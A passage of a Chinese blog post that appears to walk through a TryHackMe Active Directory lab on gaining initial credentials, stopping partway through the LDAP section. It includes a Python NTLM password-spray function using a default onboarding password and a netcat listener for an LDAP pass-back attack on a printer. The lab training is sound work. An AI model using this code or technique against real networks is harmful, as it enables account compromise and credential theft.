  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-入侵AD</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-09T07:48:16.949Z" title="发表于 2024-02-09 15:48:16">2024-02-09</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-06-10T12:49:51.268Z" title="更新于 2024-06-10 20:49:51">2024-06-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>29分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-入侵AD"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/09/thm-ru-qin-ad/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/09/thm-ru-qin-ad/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-入侵AD</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-09T07:48:16.949Z" title="发表于 2024-02-09 15:48:16">2024-02-09</time><time itemprop="dateCreated datePublished" datetime="2024-06-10T12:49:51.268Z" title="更新于 2024-06-10 20:49:51">2024-06-10</time></header><h1 id="0x01-简介">0x01 简介</h1>
<p>大约 90% 的全球财富 1000 强公司使用 Active Directory (AD)。如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标。</p>
<h2 id="breaching-active-directory">Breaching Active Directory</h2>
<p>在我们利用 AD 错误配置进行权限提升、横向移动和目标执行之前，您首先需要初始访问权限。您需要获取一组初始的有效 AD 凭据。由于 AD 服务和功能的数量众多，获取一组初始 AD 凭据的攻击面通常很大。在这个房间里，我们将讨论几种途径，但这绝不是详尽的列表。</p>
<p>在查找第一组凭据时，我们不会关注与帐户关联的权限；而是关注与帐户相关的权限。因此，即使是低权限帐户也足够了。我们只是在寻找一种对 AD 进行身份验证的方法，使我们能够对 AD 本身进行进一步的枚举。</p>
<h2 id="learning-objectives">Learning Objectives</h2>
<p>在这个网络中，我们将介绍几种可用于入侵 AD 的方法。这绝不是完整的列表，因为每天都会发现新的方法和技术。但是，我们将介绍以下技术来恢复此网络中的 AD 凭据：</p>
<ul>
<li>NTLM 认证服务</li>
<li>LDAP 绑定凭证</li>
<li>Authentication Relays 认证中继</li>
<li>微软部署工具包</li>
<li>Configuration Files 配置文件</li>
</ul>
<p>我们可以通过针对面向互联网的组织的系统或通过在组织的网络上植入恶意设备来使用这些技术进行安全评估。</p>
<h1 id="0x02-osint-和网络钓鱼">0x02 OSINT 和网络钓鱼</h1>
<p>获取第一组 AD 凭据的两种流行方法是开源情报 (OSINT) 和网络钓鱼。我们在这里仅简单提及这两种方法，因为它们已经在其他房间中进行了更深入的介绍。</p>
<h2 id="osint-开源情报"><strong>OSINT 开源情报</strong></h2>
<p>OSINT 用于发现已公开披露的信息。就 AD 凭据而言，发生这种情况的原因有多种，例如：</p>
<ul>
<li>在 Stack Overflow 等公共论坛上提问但在问题中披露敏感信息（例如凭据）的用户。</li>
<li>使用硬编码凭据将脚本上传到 Github 等服务的开发人员。</li>
<li>由于员工使用其工作帐户注册其他外部网站，因此在过去的违规行为中，凭证被泄露。 HaveIBeenPwned 和 DeHashed 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露事件。</li>
</ul>
<p>通过使用 OSINT 技术，有可能恢复公开披露的凭据。如果我们足够幸运找到凭证，我们仍然需要找到一种方法来测试它们是否有效，因为 OSINT 信息可能会过时。在任务 3 中，我们将讨论 NTLM 身份验证服务，它可能提供一个极好的途径来测试凭据以查看它们是否仍然有效。</p>
<p>A detailed room on Red Team OSINT can be found <a target="_blank" rel="noopener" href="https://tryhackme.com/jr/redteamrecon">here.</a><br>
可以在此处找到有关红队 OSINT 的详细房间。</p>
<h2 id="phishing"><strong>Phishing</strong></h2>
<p>网络钓鱼是另一种破坏 AD 的绝佳方法。网络钓鱼通常会诱使用户在恶意网页上提供凭据，或要求他们运行特定的应用程序，该应用程序会在后台安装远程访问特洛伊木马 (RAT)。这是一种流行的方法，因为 RAT 会在用户的上下文中执行，从而立即允许您模拟该用户的 AD 帐户。这就是为什么网络钓鱼对于红队和蓝队来说都是一个大话题。</p>
<p>A detailed room on phishing can be found <a target="_blank" rel="noopener" href="https://tryhackme.com/module/phishing">here.</a><br>
可以在此处找到有关网络钓鱼的详细信息。</p>
<h1 id="0x03-ntlm-验证服务">0x03 NTLM 验证服务</h1>
<h2 id="ntlm-and-netntlm">NTLM and NetNTLM</h2>
<p>新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。这种身份验证机制被网络上的服务大量使用。但是，使用 NetNTLM 的服务也可以暴露在互联网上。以下是一些流行的例子：</p>
<ul>
<li>公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。</li>
<li>暴露于互联网的服务器的远程桌面协议（RDP）服务。</li>
<li>与 AD 集成的公开 VPN 端点。</li>
<li>面向互联网并使用 NetNTLM 的 Web 应用程序。</li>
</ul>
<p>NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p>
<p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储 AD 凭据，该凭据应仅存储在域控制器上。这个过程如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p>
<h2 id="暴力登录攻击">暴力登录攻击</h2>
<p>如任务 2 中所述，这些公开的服务提供了一个极好的位置来测试使用其他方式发现的凭据。但是，也可以直接使用这些服务来尝试恢复一组初始的有效 AD 凭据。如果我们在最初的红队侦察期间恢复了有效电子邮件地址等信息，我们也许可以尝试使用它们进行暴力攻击。</p>
<p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。</p>
<p>您已获得在红队 OSINT 练习中发现的用户名列表。 OSINT 活动还显示了该组织的初始入职密码，似乎是“Changeme123”。尽管用户应始终更改其初始密码，但我们知道用户经常忘记。我们将使用定制开发的脚本对托管在以下 URL 的 Web 应用程序进行密码喷射：<a target="_blank" rel="noopener" href="http://ntlmauth.za.tryhackme.com">http://ntlmauth.za.tryhackme.com</a>。</p>
<p>导航到 URL，我们可以看到它提示我们输入 Windows 身份验证凭据：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305174537811.png" alt="image-20240305174537811"></p>
<p>注意：Firefox 的 Windows 身份验证插件非常容易失败。如果您想手动测试凭据，建议使用 Chrome。</p>
<p>我们可以使用 Hydra 等工具来协助密码喷射攻击。然而，通常最好自己编写这些类型的攻击脚本，这样您就可以更好地控制该过程。任务文件中提供了一个基本的Python脚本，可用于密码喷射攻击。以下函数是脚本的主要组成部分：</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password_spray</span>(<span class="hljs-params">self, password, url</span>):
    <span class="hljs-built_in">print</span> (<span class="hljs-string">"[*] Starting passwords spray attack using the following password: "</span> + password)
    <span class="hljs-comment">#Reset valid credential counter</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-comment">#Iterate through all of the possible usernames</span>
    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> self.users:
        <span class="hljs-comment">#Make a request to the website and attempt Windows Authentication</span>
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + <span class="hljs-string">"\\"</span> + user, password))
        <span class="hljs-comment">#Read status code of response to determine if authentication was successful</span>
        <span class="hljs-keyword">if</span> (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            <span class="hljs-built_in">print</span> (<span class="hljs-string">"[+] Valid credential pair found! Username: "</span> + user + <span class="hljs-string">" Password: "</span> + password)
            count += <span class="hljs-number">1</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> (self.verbose):
            <span class="hljs-keyword">if</span> (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                <span class="hljs-built_in">print</span> (<span class="hljs-string">"[-] Failed login with Username: "</span> + user)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">"[*] Password spray attack completed, "</span> + <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">" valid credential pairs found"</span>)</code></pre>
<p>此函数将我们建议的密码和我们定位的 URL 作为输入，并尝试使用文本文件中的每个用户名对 URL 进行身份验证。通过监控应用程序的 HTTP 响应代码的差异，我们可以确定凭证对是否有效。如果凭证对有效，应用程序将使用 200 HTTP (OK) 代码进行响应。如果该对无效，应用程序将返回 401 HTTP（未经授权）代码。</p>
<p>按照提示我们运行py脚本：如下图，共发现四个有效凭据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209163921440.png" alt="image-20240209163921440"></p>
<h1 id="0x04-ldap-绑定凭证">0x04 LDAP 绑定凭证</h1>
<h2 id="ldap">LDAP</h2>
<p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。</p>
<p>LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。其中包括应用程序和系统，例如：</p>
<ul>
<li>
<p>Gitlab</p>
</li>
<li>
<p>Jenkins</p>
</li>
<li>
<p>Custom-developed web applications</p>
</li>
<li>
<p>Printers</p>
</li>
<li>
<p>VPNs</p>
</li>
</ul>
<p>如果这些应用程序或服务中的任何一个在互联网上暴露，那么可以使用与针对 NTLM 认证系统使用的相同类型的攻击。但是，由于使用 LDAP 认证的服务需要一组 AD 凭据，因此它会打开额外的攻击途径。本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的认证访问权限。通过 LDAP 进行身份验证的过程如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164355943.png" alt="image-20240209164355943"></p>
<p>如果您可以在正确的主机（例如 Gitlab 服务器）上站稳脚跟，那么恢复这些 AD 凭据可能就像读取配置文件一样简单。这些凭证通常以纯文本形式存储在配置文件中，因为安全模型依赖于保持位置和存储配置文件的安全而不是其内容的安全。任务 7 中更深入地介绍了配置文件。</p>
<h2 id="ldap-回传攻击">LDAP 回传攻击</h2>
<p>然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。</p>
<p>当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 <code>admin:admin</code> 或 <code>admin:password</code> 。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p>
<h2 id="执行-ldap-回传">执行 LDAP 回传</h2>
<p>该网络中有一台网络打印机，管理网站甚至不需要凭据。导航至 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 以查找打印机的设置页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164722096.png" alt="image-20240209164722096"></p>
<p>使用浏览器检查，我们还可以验证打印机网站是否至少足够安全，而不仅仅是将 LDAP 密码发送回浏览器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164807332.png" alt="image-20240209164807332"></p>
<p>所以我们有用户名，但没有密码。但是，当我们按测试设置时，我们可以看到向域控制器发出身份验证请求以测试 LDAP 凭据。让我们尝试利用此漏洞让打印机连接到我们，这会泄露凭据。为此，我们使用一个简单的 Netcat 侦听器来测试是否可以让打印机连接到我们。由于LDAP的默认端口是389，我们可以使用以下命令：</p>
<pre><code class="hljs scss">nc -lvp <span class="hljs-number">389</span></code></pre>
<p>您应该看到我们恢复了连接，但有一个小问题：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165125276.png" alt="image-20240209165125276"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165131025.png" alt="image-20240209165131025"></p>
